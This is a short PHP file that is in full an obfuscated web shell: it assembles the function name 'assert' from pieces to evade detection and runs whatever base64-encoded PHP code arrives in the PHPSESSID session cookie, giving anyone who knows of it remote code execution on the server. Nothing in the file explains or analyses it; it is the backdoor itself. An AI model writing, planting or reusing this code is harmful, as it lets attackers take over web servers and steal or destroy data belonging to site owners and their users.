<?php
session_start();
$a = "a";
$s = "s";
$c=$a.$s."sert";

$c(base64_decode($_COOKIE["PHPSESSID"]));

?>
